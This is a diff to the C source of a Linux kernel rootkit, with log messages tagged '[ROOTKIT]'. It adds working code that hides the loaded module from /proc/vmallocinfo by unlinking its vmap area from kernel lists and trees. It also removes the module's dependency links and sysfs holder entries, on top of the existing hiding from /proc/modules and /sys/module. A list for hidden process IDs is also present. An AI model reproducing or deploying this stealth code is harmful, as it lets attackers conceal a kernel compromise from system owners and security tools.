@@ -1,26 +1,67 @@
 #include "utils.h"
 
 #include "constants.h"
+#include "hooking.h"
 #include "macro_utils.h"
 #include <asm/current.h>
 #include <linux/cred.h>
 #include <linux/errno.h>
 #include <linux/kobject.h>
 #include <linux/list.h>
+#include <linux/module.h>
 #include <linux/printk.h>
+#include <linux/rbtree.h>
+#include <linux/slab.h>
+#include <linux/sysfs.h>
 #include <linux/types.h>
+#include <linux/vmalloc.h>
 
 LIST_HEAD(hidden_pids_list);
 
 void hide_module(void)
 {
+    struct vmap_area *vma;
+    struct vmap_area *vma_tmp;
+    struct module_use *use;
+    struct module_use *use_tmp;
+    struct list_head *vma_list;
+    struct rb_root *vma_root;
+
+    vma_list = (struct list_head *)lookup_name("vmap_area_list");
+    vma_root = (struct rb_root *)lookup_name("vmap_area_root");
+
+    pr_info("[ROOTKIT] vma_list: %p\n", vma_list);
+    pr_info("[ROOTKIT] vma_root: %p\n", vma_root);
+
+    // Remove module from /proc/vmallocinfo
+    list_for_each_entry_safe (vma, vma_tmp, vma_list, list) {
+        if ((unsigned long)THIS_MODULE > vma->va_start &&
+            (unsigned long)THIS_MODULE < vma->va_end) {
+            pr_info("[ROOTKIT] * Removing vma %p...", vma);
+            list_del(&vma->list);
+            rb_erase(&vma->rb_node, vma_root);
+            pr_cont(" done\n");
+        }
+    }
+
     // Remove module from /proc/modules
     list_del(&THIS_MODULE->list);
 
     // Remove module from /sys/module/
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    pr_info("[ROOTKIT] Module was hidden from /proc/modules and /sys/module/\n");
+    // Clear dependency list (see kernel/module.c)
+    list_for_each_entry_safe (use, use_tmp, &THIS_MODULE->target_list, target_list) {
+        pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", use->source->name,
+                use->target->name);
+        list_del(&use->source_list);
+        list_del(&use->target_list);
+        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
+        kfree(use);
+        pr_cont(" done\n");
+    }
+
+    pr_info("[ROOTKIT] Module was hidden\n");
 }
 
 void show_all_processes(void)
